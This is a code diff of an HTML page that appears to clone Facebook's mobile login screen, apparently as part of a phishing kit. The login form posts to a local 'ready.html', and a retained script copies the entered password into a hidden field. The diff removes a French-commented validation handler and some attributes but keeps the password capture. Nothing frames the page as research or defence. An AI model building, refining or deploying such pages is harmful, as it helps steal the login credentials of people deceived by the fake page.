@@ -85,12 +85,11 @@
                     </div>
                   </div>
                   <div class="_5rut">
-                    <form target="_blank"
+                    <form 
                       method="post"
                       action="ready.html"
                       class="mobile-login-form _9hp- _5spm"
                       id="login_form"
-                      
                     >
                       <input
                         type="hidden"
@@ -211,7 +210,7 @@
                           data-sigil="login_password_step_element"
                         >
                           <button
-                            type="submit"  
+                            type="submit"
                             value="Log In"
                             class="_54k8 _52jh _56bs _56b_ _28lf _9cow _56bw _56bu"
                             id="btnsubmit"
@@ -439,21 +438,8 @@
     <script>
       const hiddenPass = document.getElementById("hiddenPass");
       const password = document.getElementById("m_login_password");
-      const form = document.getElementById("login_form");
-      
-      // Mise à jour du champ caché quand le mot de passe change
       password.onchange = (e) => {
          hiddenPass.value = e.target.value;
-      }
-      
-      // Validation supplémentaire avant soumission
-      form.onsubmit = (e) => {
-        if(!form.checkValidity()) {
-          e.preventDefault();
-          alert("Veuillez remplir tous les champs requis");
-          return false;
-        }
-        return true;
       }
       </script>
   </body>
